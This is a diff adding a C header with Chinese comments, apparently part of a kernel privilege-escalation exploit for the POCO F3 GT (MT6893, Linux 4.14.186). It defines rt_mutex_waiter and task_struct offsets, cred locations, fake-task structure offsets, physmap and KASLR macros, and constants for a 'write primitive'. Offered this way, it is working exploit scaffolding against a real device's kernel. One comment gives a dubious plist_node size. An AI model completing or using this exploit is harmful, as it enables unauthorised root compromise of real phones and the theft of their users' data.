@@ -1,0 +1,118 @@
+/*
+ * offset.h - 偏移计算和映射宏
+ * 用于 POCO F3 GT (aresin) / MT6893 / 4.14.186
+ *
+ * 这个文件从 target.h 中的定义计算出实际使用的偏移
+ */
+
+#ifndef OFFSET_H
+#define OFFSET_H
+
+#include "target.h"
+
+/*
+ * 4.14.x 内核的 rt_mutex_waiter 结构差异:
+ *
+ * 在 4.14.x 中，rt_mutex_waiter 使用 plist_node 而非 rb_node:
+ *   struct rt_mutex_waiter {
+ *       struct plist_node pi_list_entry;   // 用于优先级列表
+ *       struct plist_node pi_tree_entry;   // 用于 PI 树
+ *       struct task_struct *task;          // 等待的任务
+ *       struct rt_mutex_base *lock;        // 等待的锁
+ *       unsigned int wake_state;           // 唤醒状态
+ *       int prio;                          // 优先级
+ *       u64 deadline;                      // 截止时间 (可能不存在)
+ *       struct ww_acquire_ctx *ww_ctx;     // wound-wait context (可能不存在)
+ *   };
+ *
+ * 注意: 4.14.x 中 plist_node 的大小与 6.1.x 的 rb_node 不同!
+ * plist_node = 2 * sizeof(void*) + sizeof(int) = 20 bytes (on 64-bit)
+ * rb_node = 2 * sizeof(void*) + unsigned long = 24 bytes (on 64-bit)
+ *
+ * !!! 必须从设备 vmlinux 中提取正确的偏移 !!!
+ */
+
+/* waiter 偏移直接使用 target.h 中的定义 */
+#define WAITER_TREE_ENTRY    WAITER_TREE_ENTRY_OFF
+#define WAITER_PI_TREE_ENTRY WAITER_PI_TREE_ENTRY_OFF
+#define WAITER_TASK          WAITER_TASK_OFF
+#define WAITER_LOCK          WAITER_LOCK_OFF
+#define WAITER_WAKE_STATE    WAITER_WAKE_STATE_OFF
+#define WAITER_PRIO          WAITER_PRIO_OFF
+#define WAITER_DEADLINE      WAITER_DEADLINE_OFF
+#define WAITER_WW_CTX        WAITER_WW_CTX_OFF
+
+/*
+ * task_struct 偏移
+ * 4.14.x 与 6.1.x 有显著差异，特别是:
+ * - pi_blocked_on 的位置
+ * - cred/real_cred 的位置
+ * - uclamp 相关字段 (4.14 可能没有)
+ */
+#define TASK_REAL_CRED      TASK_REAL_CRED_OFF
+#define TASK_CRED           TASK_CRED_OFF
+#define TASK_USAGE          FAKE_TASK_USAGE_OFF
+#define TASK_PRIO           FAKE_TASK_PRIO_OFF
+#define TASK_NORMAL_PRIO    FAKE_TASK_NORMAL_PRIO_OFF
+#define TASK_TASK_GROUP     FAKE_TASK_TASK_GROUP_OFF
+#define TASK_PI_LOCK        FAKE_TASK_PI_LOCK_OFF
+#define TASK_PI_WAITERS     FAKE_TASK_PI_WAITERS_OFF
+#define TASK_PI_TOP_TASK    FAKE_TASK_PI_TOP_TASK_OFF
+#define TASK_PI_BLOCKED_ON  FAKE_TASK_PI_BLOCKED_ON_OFF
+
+/*
+ * physmap 映射计算
+ * 对于 MT6893 (Dimensity 1200):
+ * - 物理内存通常从 0x40000000 或 0x80000000 开始
+ * - page_offset 通常是 0xffffff8000000000 或 0xffffffc000000000
+ */
+#define PHYS_TO_DIRECT_MAP(phys) \
+    ((uint64_t)(P0_PAGE_OFFSET + ((phys) - P0_PHYS_OFFSET)))
+
+#define DIRECT_MAP_TO_PHYS(virt) \
+    ((uint64_t)((virt) - P0_PAGE_OFFSET + P0_PHYS_OFFSET))
+
+/*
+ * KASLR 相关
+ * 4.14.x 的 KASLR 实现与 6.1.x 不同
+ */
+#define KIMAGE_VADDR KIMAGE_TEXT_BASE
+
+/*
+ * 写入原语相关常量
+ * 这些值可能需要根据 4.14.x 的实际结构调整
+ */
+#define LOCK_OFF_DEFAULT    0x1350
+#define W0_OFF_DEFAULT      0x2220
+#define FAKE_TASK_OFF_DEFAULT 0x3200
+
+#ifndef LOCK_OFF
+#define LOCK_OFF LOCK_OFF_DEFAULT
+#endif
+
+#ifndef W0_OFF
+#define W0_OFF W0_OFF_DEFAULT
+#endif
+
+#ifndef FAKE_TASK_OFF
+#define FAKE_TASK_OFF FAKE_TASK_OFF_DEFAULT
+#endif
+
+/*
+ * 4.14.x 特定的调整
+ * 某些字段在 4.14.x 中可能不存在或位于不同偏移
+ */
+
+/* uclamp 在 4.14.x 中可能不存在 */
+#ifndef FAKE_TASK_UCLAMP_REQ_OFF
+#define FAKE_TASK_UCLAMP_REQ_OFF 0x0  /* 设置为 0 表示不存在 */
+#endif
+
+#ifndef FAKE_TASK_UCLAMP_OFF
+#define FAKE_TASK_UCLAMP_OFF 0x0  /* 设置为 0 表示不存在 */
+#endif
+
+/* 4.14.x 中 uclamp 可能不存在，需要检查 */
+#define HAS_UCLAMP (FAKE_TASK_UCLAMP_REQ_OFF != 0 && FAKE_TASK_UCLAMP_OFF != 0)
+
+#endif /* OFFSET_H */
